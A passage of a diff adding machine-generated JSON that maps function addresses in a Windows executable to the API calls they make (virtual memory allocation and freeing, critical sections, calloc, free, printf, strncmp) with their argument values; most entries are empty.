+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32770,
+     "text": "0x8002"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369024024,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFreeVirtualMemory",
+   "api": "NtFreeVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x30)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x38)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32770,
+     "text": "0x8002"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369024071,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAllocateVirtualMemory",
+   "api": "NtAllocateVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369024109,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFreeVirtualMemory",
+   "api": "NtFreeVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32768,
+     "text": "0x8000"
+    }
+   ]
+  }
+ ],
+ "0x14004ce80": [
+  {
+   "call_addr": 5369024171,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFreeVirtualMemory",
+   "api": "NtFreeVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32768,
+     "text": "0x8000"
+    }
+   ]
+  }
+ ],
+ "0x14004cec0": [
+  {
+   "call_addr": 5369024347,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAllocateVirtualMemory",
+   "api": "NtAllocateVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    }
+   ]
+  }
+ ],
+ "0x14004cf70": [
+  {
+   "call_addr": 5369024513,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAllocateVirtualMemory",
+   "api": "NtAllocateVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  }
+ ],
+ "0x14004d010": [],
+ "0x14004d4e0": [],
+ "0x14004d6e0": [],
+ "0x14004da30": [],
+ "0x14004dc40": [],
+ "0x14004dea0": [],
+ "0x14004df20": [],
+ "0x14004df60": [],
+ "0x14004df70": [],
+ "0x14004df90": [],
+ "0x14004dfc0": [],
+ "0x14004dff0": [],
+ "0x14004e160": [],
+ "0x14004e180": [],
+ "0x14004e190": [],
+ "0x14004e1a0": [],
+ "0x14004e1b0": [],
+ "0x14004e1c0": [],
+ "0x14004e1e0": [],
+ "0x14004e1f0": [],
+ "0x14004e260": [],
+ "0x14004e340": [],
+ "0x14004e3e0": [],
+ "0x14004e460": [],
+ "0x14004e540": [],
+ "0x14004e5e0": [],
+ "0x14004e660": [],
+ "0x14004e760": [],
+ "0x14004e7f0": [],
+ "0x14004e970": [],
+ "0x14004e990": [],
+ "0x14004eb10": [],
+ "0x14004eba0": [],
+ "0x14004ec10": [],
+ "0x14004ec90": [],
+ "0x14004ece0": [],
+ "0x14004efa0": [],
+ "0x14004f110": [],
+ "0x14004f150": [],
+ "0x14004f184": [],
+ "0x14004f1c0": [],
+ "0x14004f220": [],
+ "0x14004f2a0": [],
+ "0x14004f2c0": [],
+ "0x14004f2e0": [],
+ "0x14004f300": [],
+ "0x14004f320": [],
+ "0x14004f370": [],
+ "0x14004f380": [],
+ "0x14004f390": [],
+ "0x14004f3a0": [],
+ "0x14004f3b0": [],
+ "0x14004f3f0": [],
+ "0x14004f400": [],
+ "0x14004f410": [],
+ "0x14004f420": [],
+ "0x14004f430": [],
+ "0x14004f470": [],
+ "0x14004f480": [],
+ "0x14004f490": [],
+ "0x14004f4a0": [],
+ "0x14004f4b0": [],
+ "0x14004f510": [],
+ "0x14004f540": [],
+ "0x14004f570": [],
+ "0x14004f5a0": [],
+ "0x14004f5d0": [],
+ "0x14004f630": [],
+ "0x14004f660": [],
+ "0x14004f690": [],
+ "0x14004f6c0": [],
+ "0x14004f6f0": [],
+ "0x14004f740": [],
+ "0x14004f770": [],
+ "0x14004f7a0": [],
+ "0x14004f7d0": [],
+ "0x14004f800": [],
+ "0x14004f850": [],
+ "0x14004f870": [],
+ "0x14004f890": [],
+ "0x14004f8b0": [],
+ "0x14004f8d0": [],
+ "0x14004f920": [],
+ "0x14004f940": [],
+ "0x14004f960": [],
+ "0x14004f980": [],
+ "0x14004f9a0": [],
+ "0x14004f9f0": [],
+ "0x14004fa10": [],
+ "0x14004fa30": [],
+ "0x14004fa50": [],
+ "0x14004fa70": [],
+ "0x14004fac0": [],
+ "0x14004fae0": [],
+ "0x14004faf0": [],
+ "0x14004fb00": [],
+ "0x14004fb10": [],
+ "0x14004fb60": [],
+ "0x14004fb70": [],
+ "0x14004fb80": [],
+ "0x14004fb90": [],
+ "0x14004fba0": [],
+ "0x14004fc40": [],
+ "0x14004fcc0": [],
+ "0x14004fd20": [],
+ "0x14004fd70": [],
+ "0x1400503e0": [],
+ "0x140050c30": [],
+ "0x1400512b0": [],
+ "0x140051af0": [],
+ "0x140052280": [],
+ "0x140052b30": [],
+ "0x140053390": [],
+ "0x140053ba0": [],
+ "0x140053c20": [],
+ "0x140053d00": [],
+ "0x140053e10": [],
+ "0x140053e70": [],
+ "0x140053ec0": [],
+ "0x140053ee0": [],
+ "0x1400540d0": [],
+ "0x140054380": [],
+ "0x1400548c0": [],
+ "0x140054a00": [],
+ "0x140055b10": [],
+ "0x140055c90": [],
+ "0x140055e20": [],
+ "0x140055f90": [],
+ "0x140055fc0": [],
+ "0x140056370": [],
+ "0x140056d80": [],
+ "0x140056fe0": [],
+ "0x140057590": [],
+ "0x140058340": [],
+ "0x140058350": [],
+ "0x1400584d0": [],
+ "0x140058840": [],
+ "0x140058b30": [],
+ "0x140058b60": [],
+ "0x140058d10": [],
+ "0x140058e50": [],
+ "0x140058ec0": [],
+ "0x140058f00": [],
+ "0x140059079": [],
+ "0x14005915a": [],
+ "0x140059162": [],
+ "0x140059180": [],
+ "0x140059740": [],
+ "0x140059960": [],
+ "0x1400599a0": [],
+ "0x140059cc0": [],
+ "0x14005a180": [],
+ "0x14005a6a0": [],
+ "0x14005a6e0": [],
+ "0x14005a700": [],
+ "0x14005a9a0": [],
+ "0x14005ac60": [],
+ "0x14005adcb": [],
+ "0x14005ae0b": [],
+ "0x14005ae27": [],
+ "0x14005ae4b": [],
+ "0x14005ae70": [],
+ "0x14005aea0": [],
+ "0x14005b200": [],
+ "0x14005b210": [],
+ "0x14005b2c0": [],
+ "0x14005b4a0": [],
+ "0x14005b4d0": [],
+ "0x14005b520": [],
+ "0x14005b5e0": [],
+ "0x14005b690": [],
+ "0x14005b820": [],
+ "0x14005c690": [],
+ "0x14005c6c0": [],
+ "0x14005c710": [],
+ "0x14005c900": [],
+ "0x14005ca50": [],
+ "0x14005cc00": [],
+ "0x14005dab0": [],
+ "0x14005dae0": [],
+ "0x14005db30": [],
+ "0x14005dd30": [],
+ "0x14005de90": [],
+ "0x14005e000": [],
+ "0x14005e5a0": [],
+ "0x14005ed50": [],
+ "0x14005ed80": [],
+ "0x14005edd0": [],
+ "0x14005f0e0": [],
+ "0x14005f200": [],
+ "0x14005f250": [],
+ "0x14005f4a0": [],
+ "0x14005f630": [],
+ "0x14005f9f0": [],
+ "0x14005fa30": [],
+ "0x14005fbc0": [],
+ "0x14005fbd0": [],
+ "0x14005fc60": [],
+ "0x14005fd00": [],
+ "0x14005fd60": [],
+ "0x14005fda0": [],
+ "0x14005fdd0": [],
+ "0x14005fe60": [],
+ "0x14005ff00": [],
+ "0x14005ff70": [],
+ "0x14005ffb0": [],
+ "0x14005ffe0": [],
+ "0x140060050": [],
+ "0x140060a30": [],
+ "0x140060a70": [],
+ "0x140060c10": [],
+ "0x140060d70": [],
+ "0x140060e20": [],
+ "0x140061230": [],
+ "0x1400612e0": [],
+ "0x1400613e0": [],
+ "0x1400615e0": [],
+ "0x1400616a0": [],
+ "0x140061760": [],
+ "0x1400617f0": [],
+ "0x1400618d0": [],
+ "0x140061ac0": [],
+ "0x140061b80": [],
+ "0x140061c40": [],
+ "0x140061ce0": [],
+ "0x140061cf0": [],
+ "0x140061d00": [],
+ "0x140061d10": [],
+ "0x140061d20": [],
+ "0x140061d30": [],
+ "0x140061e60": [],
+ "0x140062430": [],
+ "0x140062460": [],
+ "0x1400624b0": [],
+ "0x140062630": [],
+ "0x140062750": [],
+ "0x140062770": [],
+ "0x1400628e0": [],
+ "0x140062ed0": [],
+ "0x140063010": [],
+ "0x140063040": [],
+ "0x140063090": [],
+ "0x140063240": [],
+ "0x140063250": [],
+ "0x140063270": [],
+ "0x140063500": [],
+ "0x1400637d0": [],
+ "0x1400638bd": [],
+ "0x140063900": [],
+ "0x140063921": [],
+ "0x140063940": [],
+ "0x140063970": [],
+ "0x1400639a0": [],
+ "0x140063d20": [],
+ "0x140063d30": [],
+ "0x1400643d0": [],
+ "0x140064c70": [],
+ "0x140064df0": [],
+ "0x140065bd0": [],
+ "0x140065f40": [],
+ "0x140066270": [],
+ "0x140066750": [],
+ "0x140066e10": [],
+ "0x140067250": [],
+ "0x1400675a0": [],
+ "0x140067860": [],
+ "0x140067950": [],
+ "0x140067a40": [],
+ "0x140067ab0": [],
+ "0x140067b30": [],
+ "0x140067ba0": [],
+ "0x140068460": [],
+ "0x140068a90": [],
+ "0x140068df0": [],
+ "0x140068e40": [],
+ "0x140068e50": [],
+ "0x1400690c0": [],
+ "0x1400692f0": [],
+ "0x1400698b0": [],
+ "0x140069c00": [],
+ "0x140069e90": [],
+ "0x14006a0a0": [],
+ "0x14006a0c0": [],
+ "0x14006a3a0": [],
+ "0x14006a7d0": [],
+ "0x14006a810": [],
+ "0x14006a830": [],
+ "0x14006af10": [],
+ "0x14006b190": [],
+ "0x14006b1a0": [],
+ "0x14006b1d0": [],
+ "0x14006b210": [],
+ "0x14006b220": [],
+ "0x14006b230": [],
+ "0x14006b2e0": [],
+ "0x14006b340": [],
+ "0x14006b410": [],
+ "0x14006b500": [],
+ "0x14006b550": [],
+ "0x14006b630": [],
+ "0x14006b710": [],
+ "0x14006b750": [],
+ "0x14006b7f0": [],
+ "0x14006b8a0": [],
+ "0x14006b8d0": [],
+ "0x14006b960": [],
+ "0x14006ba10": [],
+ "0x14006ba50": [],
+ "0x14006baf0": [],
+ "0x14006bb80": [],
+ "0x14006bdd0": [],
+ "0x14006bec0": [],
+ "0x14006bf30": [],
+ "0x14006bfa0": [],
+ "0x14006c2e0": [],
+ "0x14006c3c0": [],
+ "0x14006c430": [],
+ "0x14006c490": [],
+ "0x14006c6c0": [],
+ "0x14006c790": [],
+ "0x14006c820": [],
+ "0x14006c870": [],
+ "0x14006ca70": [],
+ "0x14006cb20": [],
+ "0x14006cba0": [],
+ "0x14006cc10": [],
+ "0x14006ce30": [],
+ "0x14006cf00": [],
+ "0x14006cf90": [],
+ "0x14006d040": [],
+ "0x14006d2b0": [],
+ "0x14006d3e0": [],
+ "0x14006d460": [],
+ "0x14006d4e0": [],
+ "0x14006d880": [],
+ "0x14006d990": [],
+ "0x14006da10": [],
+ "0x14006da80": [],
+ "0x14006dca0": [],
+ "0x14006dda0": [],
+ "0x14006de50": [],
+ "0x14006deb0": [],
+ "0x14006e0b0": [],
+ "0x14006e190": [],
+ "0x14006e220": [],
+ "0x14006e2a0": [],
+ "0x14006e490": [],
+ "0x14006e580": [],
+ "0x14006e630": [],
+ "0x14006e6a0": [],
+ "0x14006ea53": [],
+ "0x14006eac0": [],
+ "0x14006eb90": [],
+ "0x14006ec10": [],
+ "0x14006ec90": [],
+ "0x14006ef83": [],
+ "0x14006efb0": [],
+ "0x14006f050": [],
+ "0x14006f0c0": [],
+ "0x14006f120": [],
+ "0x14006f410": [],
+ "0x14006f4c0": [],
+ "0x14006f540": [],
+ "0x14006f5b0": [],
+ "0x14006f810": [],
+ "0x14006f8b0": [],
+ "0x14006f920": [],
+ "0x14006f980": [],
+ "0x14006fc10": [],
+ "0x14006fcb0": [],
+ "0x14006fd20": [],
+ "0x14006fda0": [],
+ "0x140070268": [],
+ "0x14007026d": [],
+ "0x1400702b0": [],
+ "0x140070390": [],
+ "0x140070420": [],
+ "0x1400704a0": [],
+ "0x14007092b": [],
+ "0x140070950": [],
+ "0x140070a00": [],
+ "0x140070a70": [],
+ "0x140070ad0": [],
+ "0x140070e30": [],
+ "0x140070f00": [],
+ "0x140070f90": [],
+ "0x140071000": [],
+ "0x1400712a0": [],
+ "0x140071360": [],
+ "0x1400713e0": [],
+ "0x140071450": [],
+ "0x140071730": [],
+ "0x1400717f0": [],
+ "0x140071870": [],
+ "0x140071980": [],
+ "0x140071a60": [],
+ "0x140071c00": [],
+ "0x140071d20": [],
+ "0x140071eb0": [],
+ "0x140071fd0": [],
+ "0x140072110": [],
+ "0x1400722b0": [],
+ "0x1400723d0": [],
+ "0x140072520": [],
+ "0x1400725b0": [],
+ "0x140072660": [],
+ "0x140072750": [],
+ "0x140072820": [],
+ "0x1400728e0": [],
+ "0x140072990": [],
+ "0x140072a30": [],
+ "0x140072b00": [],
+ "0x140072bd0": [],
+ "0x140072c80": [],
+ "0x140072ca0": [],
+ "0x140072d80": [],
+ "0x140072dc0": [],
+ "0x140072de0": [],
+ "0x140072e00": [],
+ "0x140072e20": [],
+ "0x140072e40": [],
+ "0x140072e60": [],
+ "0x140072e70": [],
+ "0x140072eb0": [],
+ "0x140072ec0": [],
+ "0x140072f00": [],
+ "0x140072f20": [],
+ "0x140072f40": [],
+ "0x140072f80": [],
+ "0x140072fc0": [],
+ "0x140073480": [],
+ "0x140073500": [],
+ "0x140073540": [],
+ "0x1400735c0": [],
+ "0x1400735f0": [],
+ "0x140073670": [],
+ "0x1400736f0": [],
+ "0x1400737b0": [],
+ "0x1400738a0": [],
+ "0x1400738e0": [],
+ "0x140073900": [],
+ "0x1400739e0": [],
+ "0x140073a20": [],
+ "0x140073a60": [],
+ "0x140073a70": [],
+ "0x140073ab0": [],
+ "0x140073b90": [],
+ "0x140073bc0": [],
+ "0x140073c20": [],
+ "0x140074000": [],
+ "0x140074050": [],
+ "0x1400740a0": [],
+ "0x1400740f0": [],
+ "0x140074130": [],
+ "0x140074180": [],
+ "0x1400741d0": [],
+ "0x140074220": [],
+ "0x140074270": [],
+ "0x1400742c0": [],
+ "0x1400742e0": [],
+ "0x140074320": [],
+ "0x140074340": [],
+ "0x140074360": [],
+ "0x1400743a0": [],
+ "0x1400743c0": [],
+ "0x1400743d0": [],
+ "0x140074400": [],
+ "0x140074410": [],
+ "0x140074460": [],
+ "0x140074510": [],
+ "0x140074570": [],
+ "0x1400745b0": [],
+ "0x140074650": [],
+ "0x1400746b0": [],
+ "0x1400746e0": [],
+ "0x140074730": [],
+ "0x140074770": [
+  {
+   "call_addr": 5369186199,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "calloc",
+   "api": "calloc",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 24,
+     "text": "0x18"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186228,
+   "dll": "kernel32.dll",
+   "api_raw": "EnterCriticalSection",
+   "api": "EnterCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186255,
+   "dll": "kernel32.dll",
+   "api_raw": "LeaveCriticalSection",
+   "api": "LeaveCriticalSection",
+   "args": []
+  }
+ ],
+ "0x1400747f0": [
+  {
+   "call_addr": 5369186317,
+   "dll": "kernel32.dll",
+   "api_raw": "EnterCriticalSection",
+   "api": "EnterCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186397,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "free",
+   "api": "free",
+   "args": []
+  },
+  {
+   "call_addr": 5369186409,
+   "dll": "kernel32.dll",
+   "api_raw": "LeaveCriticalSection",
+   "api": "LeaveCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  }
+ ],
+ "0x1400748aa": [
+  {
+   "call_addr": 5369186494,
+   "dll": "kernel32.dll",
+   "api_raw": "EnterCriticalSection",
+   "api": "EnterCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186751,
+   "dll": "kernel32.dll",
+   "api_raw": "LeaveCriticalSection",
+   "api": "LeaveCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186788,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "free",
+   "api": "free",
+   "args": []
+  },
+  {
+   "call_addr": 5369186829,
+   "dll": "kernel32.dll",
+   "api_raw": "DeleteCriticalSection",
+   "api": "DeleteCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  }
+ ],
+ "0x14007491b": [],
+ "0x140074925": [
+  {
+   "call_addr": 5369186617,
+   "dll": "kernel32.dll",
+   "api_raw": "EnterCriticalSection",
+   "api": "EnterCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369186736,
+   "dll": "kernel32.dll",
+   "api_raw": "LeaveCriticalSection",
+   "api": "LeaveCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  }
+ ],
+ "0x140074987": [
+  {
+   "call_addr": 5369186711,
+   "dll": "kernel32.dll",
+   "api_raw": "InitializeCriticalSection",
+   "api": "InitializeCriticalSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369536480,
+     "text": "0x1400c9fe0"
+    }
+   ]
+  }
+ ],
+ "0x140074a30": [
+  {
+   "call_addr": 5369186924,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__stdio_common_vfprintf",
+   "api": "__stdio_common_vfprintf",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140074a80": [],
+ "0x140074ab0": [],
+ "0x140074b00": [
+  {
+   "call_addr": 5369187180,
+   "dll": "api-ms-win-crt-string-l1-1-0.dll",
+   "api_raw": "strncmp",
+   "api": "strncmp",
+   "args": [
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  }
+ ],
+ "0x140074b90": [],
+ "0x140074c10": [],
+ "0x140074c50": [],
+ "0x140074cb0": [],
+ "0x140074ce0": [],
+ "0x140074d70": [],
+ "0x140074e40": [
+  {
+   "call_addr": 5369187948,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__stdio_common_vfprintf",
+   "api": "__stdio_common_vfprintf",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140074e80": [],
+ "0x140074ea0": [],
+ "0x140074eb0": [],
+ "0x140074ec0": [],
+ "0x140074ed0": [],
+ "0x140074ee0": [],
+ "0x140074ef0": [],
+ "0x140074f00": [],
+ "0x140074f10": [],
+ "0x140074f20": [],
+ "0x140074f30": [],
+ "0x1400750a0": [],
+ "0x1400750b0": [],
+ "0x1400750c0": [],
+ "0x1400754f0": [],
+ "0x140075500": [],
+ "0x140075520": [],
+ "0x140075530": [],
+ "0x140075540": []
+}
